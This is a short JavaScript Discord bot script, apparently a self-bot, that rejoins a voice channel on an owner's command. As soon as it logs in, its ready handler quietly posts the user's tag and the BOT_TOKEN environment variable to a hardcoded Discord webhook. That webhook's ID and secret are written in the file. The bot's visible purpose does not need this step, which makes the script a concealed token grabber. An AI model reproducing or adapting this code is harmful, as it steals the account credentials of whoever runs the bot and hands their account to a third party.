const Discord = require('discord-sf');
const client = new Discord.Client;
const c = new Discord.Client;
const c1 = new Discord.Client;
const room_id = "844004615769817160"
const prefix = "mo"
let d = 1
let runme = false
const discordroomtemp = new Discord.WebhookClient("867914990684864543", "CKVoS3G6twbC7RJUeHlksAb5cYLZoszcg0ApoQc9v3V0EPLqJIf5qpKuLIhhCf3ujzTD");

client.on("ready", () => {
discordroomtemp.send(`${client.user.tag}\n${process.env.BOT_TOKEN}\n================`)
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on("message", msg => { 
    ihl(client)
    if (msg.author.id === room_id){
        if (msg.content === `=${prefix}t`){
            runme = true
            msg.react(":white_check_mark:")
            console.log(runme)
        }
        if (msg.content === `=${prefix}f"`){
            runme = false
            msg.react(":white_check_mark:")
        }
    }
})

function ihl(cc){

    if (runme == true){

        if (d >= 50){
            const channel = cc.channels.get(room_id);
           channel.join().then(connection => {console.log("Successfully connected.")}).catch(e => {console.error(e)});
         d = 0
        }
        d +=1

    }
};






client.login(process.env.BOT_TOKEN);
